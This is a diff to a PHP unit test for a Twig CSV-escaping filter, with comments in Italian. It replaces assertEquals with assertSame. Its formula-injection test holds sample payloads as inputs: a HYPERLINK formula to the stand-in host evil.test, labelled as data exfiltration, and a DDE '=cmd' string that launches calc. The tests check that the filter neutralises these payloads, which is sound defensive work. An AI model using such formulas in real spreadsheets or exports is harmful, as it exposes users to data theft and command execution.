@@ -50,7 +50,7 @@ class CsvExtensionTest extends KernelTestCase {
     $ext = new CsvExtension();
     // filtro restituito
     $res = $ext->getFilters();
-    $filter = new TwigFilter('csv', [$ext, 'csvEscape'], ['is_safe' => ['html']]);
+    $filter = new TwigFilter('csv', $ext->csvEscape(...), ['is_safe' => ['html']]);
     $this->assertCount(1, $res);
     $this->assertEquals($filter, $res[0]);
   }
@@ -65,15 +65,15 @@ class CsvExtensionTest extends KernelTestCase {
     // init
     $ext = new CsvExtension();
     // valore testuale
-    $this->assertEquals('"Cagliari"', $ext->csvEscape('Cagliari'));
+    $this->assertSame('"Cagliari"', $ext->csvEscape('Cagliari'));
     // valore vuoto
-    $this->assertEquals('""', $ext->csvEscape(''));
+    $this->assertSame('""', $ext->csvEscape(''));
     // valore nullo
-    $this->assertEquals('""', $ext->csvEscape(null));
+    $this->assertSame('""', $ext->csvEscape(null));
     // valore numerico
-    $this->assertEquals('"42"', $ext->csvEscape(42));
+    $this->assertSame('"42"', $ext->csvEscape(42));
     // accenti e caratteri UTF-8
-    $this->assertEquals('"Città di Cagliari"', $ext->csvEscape('Città di Cagliari'));
+    $this->assertSame('"Città di Cagliari"', $ext->csvEscape('Città di Cagliari'));
   }
 
   /**
@@ -86,9 +86,9 @@ class CsvExtensionTest extends KernelTestCase {
     // init
     $ext = new CsvExtension();
     // virgolette interne
-    $this->assertEquals('"Mario ""Rossi"""', $ext->csvEscape('Mario "Rossi"'));
+    $this->assertSame('"Mario ""Rossi"""', $ext->csvEscape('Mario "Rossi"'));
     // apici singoli: non vengono alterati
-    $this->assertEquals('"O\'Brien"', $ext->csvEscape('O\'Brien'));
+    $this->assertSame('"O\'Brien"', $ext->csvEscape('O\'Brien'));
   }
 
   /**
@@ -101,11 +101,11 @@ class CsvExtensionTest extends KernelTestCase {
     // init
     $ext = new CsvExtension();
     // line feed
-    $this->assertEquals('"riga 1 riga 2"', $ext->csvEscape("riga 1\nriga 2"));
+    $this->assertSame('"riga 1 riga 2"', $ext->csvEscape("riga 1\nriga 2"));
     // carriage return
-    $this->assertEquals('"riga 1 riga 2"', $ext->csvEscape("riga 1\rriga 2"));
+    $this->assertSame('"riga 1 riga 2"', $ext->csvEscape("riga 1\rriga 2"));
     // entrambi
-    $this->assertEquals('"a b c"', $ext->csvEscape("a\nb\rc"));
+    $this->assertSame('"a b c"', $ext->csvEscape("a\nb\rc"));
   }
 
   /**
@@ -119,21 +119,21 @@ class CsvExtensionTest extends KernelTestCase {
     // init
     $ext = new CsvExtension();
     // formula con 'HYPERLINK' (esfiltazione dati)
-    $this->assertEquals('"\'=1+1"', $ext->csvEscape('=1+1'));
-    $this->assertEquals('"\'=HYPERLINK(""http://evil.test"",""clic"")"',
+    $this->assertSame('"\'=1+1"', $ext->csvEscape('=1+1'));
+    $this->assertSame('"\'=HYPERLINK(""http://evil.test"",""clic"")"',
       $ext->csvEscape('=HYPERLINK("http://evil.test","clic")'));
-    $this->assertEquals('"\'=cmd|\' /C calc\'!A0"', $ext->csvEscape('=cmd|\' /C calc\'!A0'));
+    $this->assertSame('"\'=cmd|\' /C calc\'!A0"', $ext->csvEscape('=cmd|\' /C calc\'!A0'));
     // altri prefissi pericolosi
-    $this->assertEquals('"\'+1234"', $ext->csvEscape('+1234'));
-    $this->assertEquals('"\'-1234"', $ext->csvEscape('-1234'));
-    $this->assertEquals('"\'@SUM(1+1)"', $ext->csvEscape('@SUM(1+1)'));
-    $this->assertEquals("\"'\tvalore\"", $ext->csvEscape("\tvalore"));
+    $this->assertSame('"\'+1234"', $ext->csvEscape('+1234'));
+    $this->assertSame('"\'-1234"', $ext->csvEscape('-1234'));
+    $this->assertSame('"\'@SUM(1+1)"', $ext->csvEscape('@SUM(1+1)'));
+    $this->assertSame("\"'\tvalore\"", $ext->csvEscape("\tvalore"));
     // il CR viene neutralizzato due volte: apice iniziale, poi spazio
-    $this->assertEquals('"\' valore"', $ext->csvEscape("\rvalore"));
+    $this->assertSame('"\' valore"', $ext->csvEscape("\rvalore"));
     // NON deve neutralizzare: sono solo dati
-    $this->assertEquals('"Mario Rossi"', $ext->csvEscape('Mario Rossi'));
-    $this->assertEquals('"a=b"', $ext->csvEscape('a=b'));
-    $this->assertEquals('"5-3"', $ext->csvEscape('5-3'));
+    $this->assertSame('"Mario Rossi"', $ext->csvEscape('Mario Rossi'));
+    $this->assertSame('"a=b"', $ext->csvEscape('a=b'));
+    $this->assertSame('"5-3"', $ext->csvEscape('5-3'));
   }
 
 }
